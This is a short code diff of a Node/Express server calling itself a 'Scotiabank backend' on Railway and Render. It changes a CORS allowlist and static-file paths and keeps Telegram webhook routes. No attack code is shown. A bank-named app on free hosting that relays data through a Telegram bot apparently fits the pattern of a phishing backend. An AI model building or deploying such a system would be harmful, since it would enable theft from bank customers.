@@ -29,11 +29,9 @@ const IS_PERSISTENT = DATA_DIR === '/data';
 
 /* ═══════════════════════════════════════════════════════════════
    CORS — explicit allowlist + guaranteed OPTIONS handler.
-   Replaces the old bare `app.use(cors());` which was not
-   returning Access-Control-Allow-Origin reliably behind
-   Railway's edge proxy.
    ═══════════════════════════════════════════════════════════════ */
 const ALLOWED_ORIGINS = [
+  'https://scotiabank-services-production.up.railway.app',
   'https://scotiabank-services.onrender.com',
   'http://localhost:3000',
   'http://localhost:5173'
@@ -260,7 +258,7 @@ app.get('/api/set-webhook', async (_req, res) => {
   } catch (e) { res.status(500).json({ ok:false, error: e.message }); }
 });
 
-/* ✅ NEW — delete webhook + drop pending updates, no manual token needed */
+/* ✅ delete webhook + drop pending updates, no manual token needed */
 app.get('/api/delete-webhook', async (_req, res) => {
   try {
     const r = await tgFetch(`${TELEGRAM_API}/deleteWebhook?drop_pending_updates=true`);
@@ -675,8 +673,11 @@ app.post('/api/telegram-webhook', async (req, res) => {
 /* ═══════════════════════════════════════════════════════════════
    STATIC + API 404 GUARD — registered LAST so they never
    shadow the /api/* routes defined above.
+
+   ⚠️  CHANGED: __dirname (not '..') because the HTML files now
+   live in backend/ alongside server.js.
    ═══════════════════════════════════════════════════════════════ */
-app.use(express.static(path.join(__dirname, '..'), { extensions: ['html'] }));
+app.use(express.static(__dirname, { extensions: ['html'] }));
 
 /* Any unmatched /api/* returns JSON 404, never an HTML page */
 app.use('/api', (req, res) => {
@@ -698,7 +699,7 @@ async function registerWebhook(){
 
 app.listen(PORT, async () => {
   console.log(`Scotiabank backend running on port ${PORT}`);
-  console.log(`Static HTML dir: ${path.join(__dirname, '..')}`);
+  console.log(`Static HTML dir: ${__dirname}`);
   console.log(`Data directory: ${DATA_DIR} ${IS_PERSISTENT ? '✅ PERSISTENT' : '⚠️  TEMPORARY'}`);
   if (!IS_PERSISTENT) {
     console.warn('⚠️  No persistent disk — transaction data will be WIPED on restart.');
